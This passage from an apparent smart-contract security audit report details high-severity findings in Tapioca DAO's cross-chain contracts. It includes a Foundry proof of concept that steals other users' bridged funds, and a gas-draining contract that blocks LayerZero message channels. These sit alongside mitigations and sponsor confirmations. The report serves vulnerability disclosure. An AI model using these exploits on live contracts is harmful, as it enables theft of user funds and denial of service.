InBaseTOFT,SendToStrategy(), has no validation and just delegate calls tosendToStrategy()function of theBaseTOFTStrategyModule.
In the mentioned module, the quantity debited from the user is theamountargument, having no validation in the correspondingshareamount:
functionsendToStrategy(address_from,address_to,uint256amount,uint256share,uint256assetId,uint16lzDstChainId,ICommonData.ISendOptionscalldataoptions)externalpayable{require(amount>0,"TOFT_0");bytes32toAddress=LzLib.addressToBytes32(_to);_debitFrom(_from,lzEndpoint.getChainId(),toAddress,amount);...
Then, a payload is sent to the destination chain in_lzSend()of typePT_YB_SEND_STRAT.
Again, inBaseTOFT, the function_nonBlockingLzReceive()handles the received message and delegate calls to theBaseTOFTStrategyModule, functionstrategyDeposit(). In this, function, among other things, it delegate calls todepositToYieldbox(), of the same module:
functiondepositToYieldbox(uint256_assetId,uint256_amount,uint256_share,IERC20_erc20,address_from,address_to)public{_amount=_share>0?yieldBox.toAmount(_assetId,_share,false):_amount;_erc20.approve(address(yieldBox),_amount);yieldBox.depositAsset(_assetId,_from,_to,_amount,_share);}
The_shareargument is the one the user initially provided in the source chain; however, the_amount, is computed from theyieldBoxratio, effectively overriding the specifiedamountin the source chain of1. This will credit funds to the attacker from other users that bridged assets through(m)TapiocaOFT.
The following POC in Foundry demonstrates how an attacker can be debited on the source chain an amount of1but calldepositAsset()on the destination chain with an amount of2e18, the available in theTapiocaOFTcontract.
// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.18;import{Test,console}from"forge-std/Test.sol";import{TapiocaOFT}from"contracts/tOFT/TapiocaOFT.sol";import{BaseTOFTStrategyModule}from"contracts/tOFT/modules/BaseTOFTStrategyModule.sol";import{IYieldBoxBase}from"tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";import{ISendFrom}from"tapioca-periph/contracts/interfaces/ISendFrom.sol";import{ICommonData}from"tapioca-periph/contracts/interfaces/ICommonData.sol";import{ERC20}from"@openzeppelin/contracts/token/ERC20/ERC20.sol";contractMockYieldBoxisTest{functiondepositAsset(uint256assetId,addressfrom,addressto,uint256amount,uint256share)externalpayablereturns(uint256,uint256) {}functiontoAmount(uint256,uint256share,bool)externalpurereturns(uint256amount) {// real formula amount = share._toAmount(totalSupply[assetId], _tokenBalanceOf(assets[assetId]), roundUp);// assume ratio is 1:1returnshare;}}contractTapiocaOFTPOCisTest{addresspublicconstantLZ_ENDPOINT=0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;uint16internalconstantPT_YB_SEND_STRAT=770;functiontest_POC_SendToStrategy_WithoutAllDebitedFrom()public{vm.createSelectFork("https://eth.llamarpc.com");addressmockERC20_=address(newERC20("mockERC20","MERC20"));addressstrategyModule_=address(newBaseTOFTStrategyModule(address(LZ_ENDPOINT),address(0),IYieldBoxBase(address(2)),"SomeName","SomeSymbol",18,block.chainid));addressmockYieldBox_=address(newMockYieldBox());TapiocaOFTtapiocaOft_=newTapiocaOFT(LZ_ENDPOINT,mockERC20_,IYieldBoxBase(mockYieldBox_),"SomeName","SomeSymbol",18,block.chainid,payable(address(1)),payable(strategyModule_),payable(address(3)),payable(address(4)));// some user wraps 2e18 mock erc20addressuser_=makeAddr("user");deal(mockERC20_,user_,2e18);vm.startPrank(user_);ERC20(mockERC20_).approve(address(tapiocaOft_),2e18);tapiocaOft_.wrap(user_,user_,2e18);vm.stopPrank();addressattacker_=makeAddr("attacker");deal(attacker_,1e18);// lz feesaddressfrom_=attacker_;addressto_=attacker_;uint256amount_=1;uint256share_=2e18;// steal all available funds in (m)Tapioca (only 1 user with 2e18)uint256assetId_=1;uint16lzDstChainId_=102;addresszroPaymentAddress_=address(0);ICommonData.ISendOptionsmemoryoptions_=ICommonData.ISendOptions(200_000,zroPaymentAddress_);tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_,abi.encodePacked(tapiocaOft_));// attacker is only debited 1 amount, but specifies 2e18 shares, a possibly much bigger corresponding amountdeal(mockERC20_,attacker_,1);vm.startPrank(attacker_);ERC20(mockERC20_).approve(address(tapiocaOft_),1);tapiocaOft_.wrap(attacker_,attacker_,1);tapiocaOft_.sendToStrategy{value:1ether}(from_,to_,amount_,share_,assetId_,lzDstChainId_,options_);vm.stopPrank();bytesmemorylzPayload_=abi.encode(PT_YB_SEND_STRAT,bytes32(uint256(uint160(from_))),attacker_,amount_,share_,assetId_,zroPaymentAddress_);// attacker was debited from 1 amount, but deposit sends an amount of 2e18vm.expectCall(address(mockYieldBox_),0,abi.encodeCall(MockYieldBox.depositAsset, (assetId_,address(tapiocaOft_),attacker_,2e18,2e18)));vm.prank(LZ_ENDPOINT);tapiocaOft_.lzReceive(102,abi.encodePacked(tapiocaOft_,tapiocaOft_),0,lzPayload_);}}
Tools Used
Vscode, Foundry
Recommended Mitigation Steps
Given that it’s impossible to fetch theYieldBoxratio in the source chain, it’s best to stick with the amount only and remove theshareargument in the cross chainsendToStrategy()function call.
0xRektora (Tapioca) confirmed

[H-15] Attacker can specify anyreceiverinUSD0.flashLoan()to drainreceiverbalance
Submitted bymojito_auditor, also found byn1punp
The flash loan feature in USD0’sflashLoan()function allows the caller to specify thereceiveraddress. USD0 is then minted to this address and burnt from this address plus a fee after the callback. Since there is a fee in each flash loan, an attacker can abuse this to drain the balance of thereceiverbecause thereceivercan be specified by the caller without validation.
Proof of Concept
The allowance checked thatreceiverapproved toaddress(this)but not check ifreceiverapproved tomsg.sender
uint256_allowance=allowance(address(receiver),address(this));require(_allowance>= (amount+fee),"USDO: repay not approved");// @audit can specify receiver, drain receiver's balance_approve(address(receiver),address(this),_allowance- (amount+fee));_burn(address(receiver),amount+fee);returntrue;
Recommended Mitigation Steps
Consider changing the “allowance check” to be the allowance that the receiver gave to the caller instead ofaddress(this).
0xRektora (Tapioca) confirmed

[H-16] Attacker can block LayerZero channel due to variable gas cost of saving payload
Submitted bywindhustler
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/BaseUSDO.sol#L399
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/BaseTOFT.sol#L442
https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L52
This is an issue that affectsBaseUSDO,BaseTOFT, andBaseTapOFTor all the contracts which are sending and receiving LayerZero messages.
The consequence of this is that anyone can with low cost and high frequency keep on blocking the pathway between any two chains, making the whole system unusable.
Proof of Concept
I will illustrate the concept of blocking the pathway on the example of sending a message throughBaseTOFT’ssendToYAndBorrow.
This function allows the user to mint/borrowUSDOwith some collateral that is wrapped in aTOFTand gives the option of transferring mintedUSDOto another chain.
The attack starts by invokingsendToYBAndBorrowwhich delegate calls intoBaseTOFTMarketModule.
If we look at the implementation inside theBaseTOFTMarketModulenothing is validated there except for thelzPayloadwhich has the packetType ofPT_YB_SEND_SGL_BORROW.
The only validation of the message happens inside theLzAppwith the configuration which was set.
What is restrained within this configuration is thepayload size, which if not configured defaults to10k bytes.
The application architecture was set up in a way that all the messages regardless of their packetType go through the same_lzSendimplementation.
I’m mentioning that because it means that if the project decides to change the default payload size to something smaller(or bigger) it will be dictated by the message with the biggest possible payload size.
I’ve mentioned theminimum gas enforcement in my other issuebut even if that is fixed and a high min gas is enforced this is another type of issue.
To execute the attack we need to pass the following parameters to the function mentioned above:
functionexecuteAttack()public{addresstapiocaOFT=makeAddr("TapiocaOFT-AVAX");tapiocaOFT.sendToYBAndBorrow{value:enough_gas_to_go_through}(addressfrom=>// malicious user addressaddressto=>// malicious user addresslzDstChainId=>// any chain lzChainIdbytescalldataairdropAdapterParams=>// encode in a way to send to remote with minimum gas enforced by the layer zero configurationITapiocaOFT.IBorrowParamscalldataborrowParams,// can be anythingICommonData.IWithdrawParamscalldatawithdrawParams,// can be anythingICommonData.ISendOptionscalldataoptions,// can be anythingICommonData.IApproval[]calldataapprovals// Elaborating on this below)}
ICommonData.IApproval[] calldata approvalsare going to be fake data somax payload size limit is reached(10k). Thetargetof the 1st approval in the array will be theGasDrainingContractdeployed on the receiving chain and thepermitBorrow = true.
contractGasDrainingContract{mapping(uint256=>uint256)publicstorageVariables;functionpermitBorrow(addressowner,addressspender,uint256value,uint256deadline,uint8v,bytes32r,bytes32s)external{for(uint256i=0;i<100000;i++) {storageVariables[i] =i;}}}
Let’s take an example of an attacker sending a transaction on the home chain which specifies a 1 million gasLimit for the destination transaction.
Transaction is successfully received inside thelzReceiveafter which it reaches_blockingLzReceive.This is the first external call and according toEIP-150out of 1 million gas:63/64 or ~985k would be forwarded to the external call.1/64 or ~15k will be left for the rest of the execution.The cost of saving a big payload into thefailedMessagesand emitting events is higher than 15k.
When it comes to 10k bytes it is around 130k gas but even with smaller payloads, it is still significant. It can be tested with the following code:
// SPDX-License-Identifier: Unlicensepragmasolidity^0.8.19;import"forge-std/Test.sol";import"forge-std/console.sol";contractFailedMessagesTestisTest{mapping(uint16=>mapping(bytes=>mapping(uint64=>bytes32)))publicfailedMessages;eventMessageFailed(uint16_srcChainId,bytes_srcAddress,uint64_nonce,bytes_payload,bytes_reason);functionsetUp()public{}functiontestFMessagesGas()public{uint16srcChainid=1;bytesmemorysrcAddress=abi.encode(makeAddr("Alice"));uint64nonce=10;bytesmemorypayload=getDummyPayload(9999);// max payload size someone can send is 9999 bytesbytesmemoryreason=getDummyPayload(2);uint256gasLeft=gasleft();_storeFailedMessage(srcChainid,srcAddress,nonce,payload,reason);emitlog_named_uint("gas used",gasLeft-gasleft());}function_storeFailedMessage(uint16_srcChainId,bytesmemory_srcAddress,uint64_nonce,bytesmemory_payload,bytesmemory_reason)internalvirtual{failedMessages[_srcChainId][_srcAddress][_nonce] =keccak256(_payload);emitMessageFailed(_srcChainId,_srcAddress,_nonce,_payload,_reason);}functiongetDummyPayload(uint256payloadSize)internalpurereturns(bytesmemory) {bytesmemorypayload=newbytes(payloadSize);for(uint256i=0;i<payloadSize;i++) {payload[i] =bytes1(uint8(65+i));}returnpayload;}}
If the payload is 9999 bytes the cost of saving it and emitting the event is 131k gas.Even with a smaller payload of 500 bytes the cost is 32k gas.If we can drain the 985k gas in the rest of the execution since storingfailedMessageswould fail the pathway would be blocked because this will fail at the level of LayerZero and result inStoredPayload.Let’s continue the execution flow just to illustrate how this would occur, inside the implementation for_nonblockingLzReceivethe_executeOnDestinationis invoked for the right packet type and there we have anotherexternal callwhich delegatecalls into the right module.
Since it is also an external call only 63/64 gas is forwarded which is roughly:
970k would be forwarded to the module15k reserved for the rest of the functionThis 970k gas is used forborrow, and it would be totally drained inside ourmalicious GasDraining contract from above, and then the execution would continue inside theexecuteOnDestinationwhich also fails due to 15k gas not being enough, and finally, it fails inside the_blockingLzReceivedue to out of gas, resulting in blocked pathway.
Tools Used
Foundry
Recommended Mitigation Steps
_executeOnDestinationstoring logicis just code duplication and serves no purpose.
Instead of that you should override the_blockingLzReceive.
Create a new storage variable calledgasAllocationwhich can be set only by the owner and change the implementation to:
(boolsuccess,bytesmemoryreason) =address(this).excessivelySafeCall(gasleft() -gasAllocation,150,abi.encodeWithSelector(this.nonblockingLzReceive.selector,_srcChainId,_srcAddress,_nonce,_payload));
While ensuring thatgasleft() > gasAllocationin each and every case. This should be enforced on the sending side.
Now this is tricky because as I have shown the gas cost of storing payload varies with payload size meaning thegasAllocationneeds to be big enough to cover storing max payload size.
Other occurrences
This exploit is possible with all the packet types which allow arbitrary execution of some code on the receiving side with something like I showed with theGasDrainingContract. Since almost all packets allow this it is a common issue throughout the codebase, but anyway listing below where it can occur in various places:
BaseTOFThttps://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L205https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L204https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L111https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L221https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L118BaseUSDOhttps://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L191https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L190https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L104https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L93https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L206https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L103BaseTapOFThttps://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L225Here we would need to passIERC20[] memory rewardTokensas an array of one award token which is our malicious token which implements theERC20andISendFrominterfaces.
Since inside thetwTap.claimAndSendRewards(tokenID, rewardTokens)there are no reverts in case therewardTokenis
invalid we can execute the gas draining attack inside thesendFromwherebyrewardTokens[i]is our malicious contract.
0xRektora (Tapioca) confirmed

[H-17] Attacker can block LayerZero channel due to missing check of minimum gas passed
Submitted bywindhustler, also found by0x73696d616f
This is an issue that affects all the contracts that inherit fromNonBlockingLzAppdue to incorrect overriding of thelzSendfunction and lack of input validation and the ability to specify whateveradapterParamsyou want.
The consequence of this is that anyone can with a low cost and high frequency keep on blocking the pathway between any two chains, making the whole system unusable.
Proof of Concept
Layer Zero minimum gas showcase
While sending messages through LayerZero, the sender can specify how much gas he is willing to give to the Relayer to deliver the payload to the destination chain. This configuration is specified inrelayer adapter params.
All the invocations oflzSendinside the TapiocaDao contracts naively assume that it is not possible to specify less than 200k gas on the destination, but in reality, you can pass whatever you want.
As a showcase, I have set up a simple contract that implements theNonBlockingLzAppand sends only 30k gas which reverts on the destination chain resulting inStoredPayloadand blocking of the message pathway between the two lzApps.
The transaction below proves that if no minimum gas is enforced, an application that has the intention of using theNonBlockingAppcan end up in a situation where there is aStoredPayloadand the pathway is blocked.
Transaction Hashes for the example mentioned above:
LayerZero Scan:https://layerzeroscan.com/106/address/0xe6772d0b85756d1af98ddfc61c5339e10d1b6eff/message/109/address/0x5285413ea82ac98a220dd65405c91d735f4133d8/nonce/1Tenderly stack trace of the sending transaction hash:https://dashboard.tenderly.co/tx/avalanche-mainnet/0xe54894bd4d19c6b12f30280082fc5eb693d445bed15bb7ae84dfaa049ab5374d/debugger?trace=0.0.1Tenderly stack trace of the receiving transaction hash:https://dashboard.tenderly.co/tx/polygon/0x87573c24725c938c776c98d4c12eb15f6bacc2f9818e17063f1bfb25a00ecd0c/debugger?trace=0.2.1.3.0.0.0.0
Attack scenario
The attacker callstriggerSendFromand specifies a small amount of gas in theairdropAdapterParams(~50k gas).
The Relayer delivers the transaction with the specified gas at the destination.
The transaction is first validated through the LayerZero contracts before it reaches thelzReceivefunction. The Relayer will give exactly the gas which was specified through theairdropAdapterParams.
The line where it happens inside the LayerZero contract ishere, and{gas: _gasLimit}is the gas the sender has paid for.
The objective is that due to this small gas passed the transaction reverts somewhere inside thelzReceivefunction and the message pathway is blocked, resulting inStoredPayload.
The objective of the attack is that the execution doesn’t reach theNonblockingLzAppsince then the behavior of theNonBlockingLzAppwould be as expected and the pathway wouldn’t be blocked,
but rather the message would be stored inside thefailedMessages
Tools Used
Foundry, Tenderly, LayerZeroScan
Recommended Mitigation Steps
The minimum gas enforced to send for each and every_lzSendin the app should be enough to cover the worst-case scenario for the transaction to reach the
first try/catch which ishere.
I would advise the team to do extensive testing so this min gas is enforced.
Immediate fixes:
This is most easily fixed by overriding the_lzSendand extracting the gas passed from adapterParams with_getGasLimitand validating that it is above some minimum threshold.Another option is specifying the minimum gas for each and every packetType and enforcing it as such.
I would default to the first option because the issue is twofold since there is the minimum gas that is common for all the packets, but there is also the minimum gas per packet since each packet has a different payload size and data structure, and it is being differently decoded and handled.
Note: This also applies to the transaction which when received on the destination chain is supposed to send another message, this callback message should also be validated.
When it comes to the default implementations inside theOFTCoreV2there are two packet typesPT_SENDandPT_SEND_AND_CALLand there is the available configuration ofuseCustomAdapterParamswhich can enforce the minimum gas passed. This should all be configured properly.
Other occurrences
There are many occurrences of this issue in the TapiocaDao contracts, but applying option 1 I mentioned in the mitigation steps should solve the issue for all of them:
TapiocaOFTlzSendhttps://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L101- lzData.extraGas This naming is misleading it is not extraGas it is the gas that is used by the Relayer.https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L68https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L99https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L66https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L114https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L70https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L111sendFromhttps://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142- This is executed as a part of lzReceive but is a message inside a message. It is also subject to the attack above, although it goes through thePT_SENDso adequate config should solve the issue.https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L241BaseUSDOlzSendhttps://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L41https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L86https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L51https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOLeverageModule.sol#L82https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L48https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOMarketModule.sol#L87sendFromhttps://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L127https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/usd0/modules/USDOOptionsModule.sol#L226BaseTapOFTlzSendhttps://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L108https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L181https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L274sendFromhttps://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L229https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L312MagnetarV2https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/main/contracts/Magnetar/MagnetarV2.sol#L268MagnetarMarketModulehttps://github.com/Tapioca-DAO/tapioca-periph-audit/blob/main/contracts/Magnetar/modules/MagnetarMarketModule.sol#L725
0xRektora (Tapioca) confirmed via duplicate issue 841

[H-18]multiHopSellCollateral()will fail due to call on an invalid market address causing bridged collateral to be locked up
Submitted bypeakbolt
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/markets/singularity/Singularity.sol#L409-L427
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/markets/singularity/SGLLeverage.sol#L81
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L79-L108
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L227
multiHopSellCollateral()allows users to leverage down by selling theTOFTcollateral on another chain and then send it to host chain (Arbitrum) for repayment of USDO loan.
However, it will fail as it tries to obtain therepayableAmounton the destination chain by callingIMagnetar.getBorrowPartForAmount()on a non-existing market. That is because Singularity/BigBang markets are only deployed on the host chain.
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/master/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L205-L227
functionleverageDownInternal(uint256amount,IUSDOBase.ILeverageSwapDatamemoryswapData,IUSDOBase.ILeverageExternalContractsDatamemoryexternalData,IUSDOBase.ILeverageLZDatamemorylzData,addressleverageFor)publicpayable{_unwrap(address(this),amount);//swap to USDOIERC20(erc20).approve(externalData.swapper,amount);ISwapper.SwapDatamemory_swapperData=ISwapper(externalData.swapper).buildSwapData(erc20,swapData.tokenOut,amount,0,false,false);(uint256amountOut, ) =ISwapper(externalData.swapper).swap(_swapperData,swapData.amountOutMin,address(this),swapData.data);//@audit this call will fail as there is no market in destination chain//repayuint256repayableAmount=IMagnetar(externalData.magnetar).getBorrowPartForAmount(externalData.srcMarket,amountOut);
Impact
The issue will prevent users from usingmultiHopSellCollateral()to leverage down.
Furthermore the failure of the cross-chain transaction will cause the bridged collateral to be locked in the TOFT contract on a non-host chain as the refund mechanism will also revert andretryMessage()will continue to fail as this is a permanent error.
Proof of Concept
Consider the following scenario where a user leverage down by selling the collateral on Ethereum (a non-host chain).
User first triggersSingularity.multiHopSellCollateral()on host chain Arbitrum.That will callSGLLeverage.multiHopSellCollateral(), which will conduct a cross chain message viaITapiocaOFT(address(collateral)).sendForLeverage()to bridge over and sell the collateral on Ethereum mainnet.The collateral TOFT contract on Ethereum mainnet will receive the bridged collateral and cross-chain message via_nonBlockingLzReceive()and thenBaseTOFTLeverageModule.leverageDown().The execution continues withBaseTOFTLeverageModule.leverageDownInternal(), but it will revert as it attempt to callgetBorrowPartForAmount()for a non-existing market in Ethereum.The bridgex collateral will be locked in the TOFT contract on Ethereum mainnet as the refund mechanism will also revert andretryMessage()will continue to fail as this is a permanent error.
Recommended Mitigation Steps
Obtain the repayable amount on the Arbitrum (host chain) where the BigBang/Singularity markets are deployed.
0xRektora (Tapioca) confirmed

[H-19]twTAP.participate()can be permanently frozen due to lack of access control on host-chain-only operations
Submitted bypeakbolt
twTAPis a omnichain NFT (ONFT721) that will be deployed on all supported chains.
However, there are no access control for operations meant for execution on the host chain only, such asparticipate(), which mintstwTAP.
The implication of not restrictingparticipate()to host chain is that an attacker can lockTAPand participate on other chain to minttwTAPwith a tokenId that does not exist on the host chain yet. The attacker can then send thattwTAPto the host chain using the inheritedsendFrom(), to permanently freeze thetwTAPcontract asparticipate()will fail when attempting to mint an existingtokenId.
It is important to restrict minting to the host chain so thatmintedTWTap(which keeps track of last minted tokenId) is only incremented at one chain, to prevent duplicate tokenId. That is because thetwTAPcontracts on each chain have their ownmintedTWTapvariable and there is no mechanism to sync them.
Detailed Explanation
InTwTAP, there are no modifiers or checks to ensureparticipte()can only be called on the host chain. So we can use it to mint atwTAPon a non-host chain.https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L252-L256
functionparticipate(address_participant,uint256_amount,uint256_duration)externalreturns(uint256tokenId) {require(_duration>=EPOCH_DURATION,"twTAP: Lock not a week");
ThetokenIdto be minted is determined bymintedTWTap, which is not synchronized across the chains.
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L309-L310
functionparticipate(...//@audit tokenId to mint is obtained from `mintedTWTap`tokenId= ++mintedTWTap;_safeMint(_participant,tokenId);
Suppose on host chain, the last mintedtokenIdisN. From a non-host chain, we can usesendFrom()to send over atwTAPwithtokenIdN+1and mint a newtwTAPwith the sametokenId(see_creditTo()below). This will not incrementmintedTWTapon the host chain, causing a de-sync.
<br>https:function _creditTo(uint16, address _toAddress, uint _tokenId) internal virtual override{require(!_exists(_tokenId) || (_exists(_tokenId) &&ERC721.ownerOf(_tokenId) ==address(this)));if(!_exists(_tokenId)) {//@audit transfering token N+1 will mint it as it doesnt exists. this will not increment mintedTwTap_safeMint(_toAddress,_tokenId);}else{_transfer(address(this),_toAddress, _tokenId);}}
On the host chain,participate()will always revert when it tries to mint the nexttwTAPwithtokenIdN+1, as it now exists on the host chain due tosendFrom().
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L309-L310
functionparticipate(...tokenId= ++mintedTWTap;//@audit this will always revert when tokenId already exists_safeMint(_participant,tokenId);
Impact
An attacker will be able to permanent freeze thetwTAP.participate(). This will preventTAPholders from participating in the governance and from claiming rewards, causing loss of rewards to users.
Proof of Concept
Consider the following scenario,
Suppose we start withtwTAP.mintedTwTap == 0on all the chains, so next tokenId will be1.Attackerparticipate()with 1 TAP and minttwTAPon a non-host chain withtokenId1.Attacker sends the mintedtwTAPacross to host chain usingtwTAP.sendFrom()to permanently freeze thetwTAPcontract.On the host chain, thetwTAPcontract receives the cross chain message and mint atwTAPwithtokenId1to attacker as it does not exist on host chain yet. (Note this cross-chain transfer is part of Layer Zero ONFT71 mechanism)Now on the host chain, we have atwTAPwithtokenId1butmintedTwTapis still0. That means when users try toparticipate()on the host chain, it will try to mint atwTAPwithtokenId1, and that will fail as it now exists on the host chain. At this pointparticipate()will be permanently DoS, affecting governance and causing loss of rewards.Note that the attacker can then transfer thetwTAPback to the source chain and exit position to retrieve the lockedTAPtoken. However, the host chain still remain frozen as the owner oftokenId1will now betwTAPcontract itself after the cross chain transfer.
Note that the attack is still possible even whenmintedTwTap > 0on host chain as attacker just have to repeatly mint on the non-host chain till it obtain the requiredtokenId.
Recommended Mitigation Steps
Add in access control to prevent host-chain-only operations such asparticipate()from being executed on other chains .
0xRektora (Tapioca) confirmed

[H-20]_liquidateUser()should not re-use the same minimum swap amount out for multiple liquidation
Submitted bypeakbolt, also found bycarrotsmuggler,Nyx,n1punp,Ack, andrvierdiiev
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/markets/singularity/SGLLiquidation.sol#L337-L340
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L603-L606
Vulnerability details
In Singularity and BigBang, theminAssetAmountin_liquidateUser()is provided by the liquidator as a slippage protection to ensure that the swap provides the specifiedamountOut. However, the same value is utilized even whenliquidate()is used to liquidate multiple borrowers.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/master/contracts/markets/singularity/SGLLiquidation.sol#L337-L351
function_liquidateUser(...uint256minAssetAmount=0;if(dexData.length > 0) {//@audit the same minAssetAmount is incorrectly applied to all liquidationsminAssetAmount=abi.decode(dexData, (uint256));}ISwapper.SwapDatamemoryswapData=swapper.buildSwapData(collateralId,assetId,0,collateralShare,true,true);swapper.swap(swapData,minAssetAmount,address(this),"");
Impact
Using the sameminAssetAmount(minimum amountOut for swap) for the liquidation of multiple borrowers will result in inaccurate slippage protection and transaction failure.
IfminAssetAmountis too low, there will be insufficient slippage protection and the the liquidator and protocol could be short changed with a worse than expected swap.
IfminAssetAmountis too high, the liquidation will fail as the swap will not be successful.
Proof of Concept
First scenario
Liquidator liquidates two loans X & Y usingliquidate(), and set theminAssetAmountto be 1000 USDO.Loan X liquidated collateral is worth 1000 USDO and the swap is completely successful with zero slippage.However, Loan Y liquidated collateral is worth 5000 USDO, but due to low liquidity in the swap pool, it was swapped at 1000 USDO (minAssetAmount).
The result is that the liquidator will receive a fraction of the expected reward and the protocol gets repaid at 1/5 of the price, suffering a loss from the swap.
Second scenario
Liquidator liquidates two loans X & Y usingliquidate(), and set theminAssetAmountto be 1000 USDO.Loan X liquidated collateral is worth 1000 USDO and the swap is completely successful with zero slippage.we suppose Loan Y’s liquidated collateral is worth 300 USDO.
Now theminAssetAmountof 1000 USDO will be higher than the collateral, which is unlikely to be completed as it is higher than market price. That will revert the entireliquidate(), causing the liquidation of Loan X to fail as well.
Recommended Mitigation Steps
Updateliquidate()to allow liquidator to pass in an array ofminAssetAmountvalues that corresponding to the liquidated borrower.
An alternative, is to pass in the minimum expected price of the collateral and use that to compute theminAssetAmount.
0xRektora (Tapioca) confirmed via duplicate issue 122

[H-21] Incorrect liquidation reward computation causes excess liquidator rewards to be given
Submitted bypeakbolt, also found byminhtrng,bin2chen,carrotsmuggler,0x007, and 0xRobocop (1,2)
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L577
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLiquidation.sol#L310-L314
In_liquidateUser()for BigBang and Singularity, the liquidator reward is derived by_getCallerReward(). However, it is incorrectly computed usinguserBorrowPart[user], which is the portion of borrowed amount that does not include the accumulated fees (interests).
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L576-L580
uint256callerReward=_getCallerReward(//@audit - userBorrowPart[user] is incorrect as it does not include accumulated feesuserBorrowPart[user],startTVLInAsset,maxTVLInAsset);
Using onlyuserBorrowPart[user]is inconsistent with liquidation calculation inMarket.sol#L423-L424, which is based on borrowed amount including accumulated fees.
